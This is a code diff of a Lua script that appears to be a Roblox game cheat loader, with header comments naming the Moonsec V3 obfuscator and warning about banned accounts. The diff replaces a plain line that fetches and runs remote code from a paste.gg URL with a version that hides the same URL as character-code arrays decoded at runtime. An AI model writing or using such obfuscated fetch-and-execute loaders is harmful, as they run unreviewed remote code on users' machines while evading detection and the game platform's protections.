@@ -10,4 +10,21 @@
               --Obsfucator : Moonsec V3
               --WARNING : im not responsible for this script using or Banned Account (Sometimes Gui can Be Dectected or Patched will switch to another)
               --This Script protect to not being Patches
-loadstring(game:HttpGet("https://paste.gg/p/sorx./60165cb7336043c1b13bec4c715a39c7/files/398cc92f126c462d9d3fc86842deb41e/raw"))()
+local a = {104, 116, 116, 112, 115, 58, 47, 47}
+local b = {112, 97, 115, 116, 101, 46, 103, 103, 47}
+local c = {112, 47, 115, 111, 114, 120, 46, 47}
+local d = {54, 48, 49, 54, 53, 99, 98, 55, 51, 51, 54, 48, 52, 51, 99, 49, 98, 49, 51, 98, 101, 99, 52, 99, 55, 49, 53, 97, 51, 57, 99, 55, 47}
+local e = {102, 105, 108, 101, 115, 47}
+local f = {51, 57, 56, 99, 99, 57, 50, 102, 49, 50, 54, 99, 52, 54, 50, 100, 57, 100, 51, 102, 99, 56, 54, 56, 52, 50, 100, 101, 98, 52, 49, 101, 47}
+local g = {114, 97, 119}
+
+local function decode(t)
+    local s = ""
+    for _, v in ipairs(t) do
+        s = s .. string.char(v)
+    end
+    return s
+end
+
+local url = decode(a) .. decode(b) .. decode(c) .. decode(d) .. decode(e) .. decode(f) .. decode(g)
+loadstring(game:HttpGet(url))()
